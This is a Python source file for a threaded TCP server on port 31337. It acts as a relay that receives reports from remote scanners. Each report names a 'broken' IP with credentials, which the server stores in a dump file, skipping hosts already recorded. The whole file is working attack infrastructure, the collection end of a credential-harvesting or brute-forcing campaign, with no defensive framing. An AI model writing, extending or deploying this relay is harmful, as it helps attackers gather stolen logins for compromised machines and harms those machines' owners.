import socket, os
from datetime import datetime
from threading import Thread 
from socketserver import ThreadingMixIn 
from colorama import Fore, Back, Style, init

# modules
from libs import truecolors

relay_ps    = "||"
__MAXCONN__ = 1000
__PORT__    = 31337


def mkdir(path):
    if not os.path.exists(path):
        os.makedirs(path)

class ClientThread(Thread): 
    def __init__(self,ip,port,conn): 
        Thread.__init__(self) 
        self.ip = ip 
        self.port = port 
        self.conn = conn
 
    def run(self): 
        global relay_ps
        data = self.conn.recv(2048) 
        data = str(data, 'utf-8', 'ignore')
        if data.split(relay_ps)[0] == "!":
            truecolors.print_info("Received connection -> " + ip + ":" + str(port)) 
            truecolors.print_info("Remote scanner (%s:%s) is sending data.."%(self.ip,str(self.port)))
            while True:
                try:
                    if data.split(relay_ps)[3] in open(os.path.dirname(os.path.realpath(__file__))+r"\dump\csdb.txt").read():
                        truecolors.print_errn("Ip: %s already broken, continuing ..." % data.split(relay_ps)[3])
                        break
                    else:
                        with open(os.path.dirname(os.path.realpath(__file__))+r"\dump\csdb.txt", "a") as f:
                            f.write("%s:%s:%s:%s\n"%(data.split(relay_ps)[1],data.split(relay_ps)[2],data.split(relay_ps)[3],data.split(relay_ps)[4]))
                            truecolors.print_succ("Remote scanner (%s:%s) stored new credentials!"%(self.ip,str(self.port)))
                            break
                except Exception as e: # in use
                    truecolors.print_errn(str(e))
            self.conn.send("10".encode('ascii'))
        elif data == "#":
            truecolors.print_info("Received remote scanner ping (%s:%s) .."%(self.ip,str(self.port)))
            self.conn.send("200".encode('ascii'))
        


mkdir(os.path.dirname(os.path.realpath(__file__))+r"\dump")
TCP_IP = '0.0.0.0' 
TCP_PORT = int(__PORT__)  
truecolors.print_info("Starting relay on port: %s"%str(__PORT__))
truecolors.print_warn("Configuration set to allow %s connections.."%str(__MAXCONN__))
tcpServer = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
tcpServer.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
tcpServer.bind((TCP_IP, TCP_PORT)) 
threads = [] 
truecolors.print_succ("Relay is online!")
while True: 
    tcpServer.listen(int(__MAXCONN__)) 
    (conn, (ip,port)) = tcpServer.accept() 
    newthread = ClientThread(ip,port,conn) 
    newthread.start() 
    threads.append(newthread) 
for t in threads: 
    t.join() 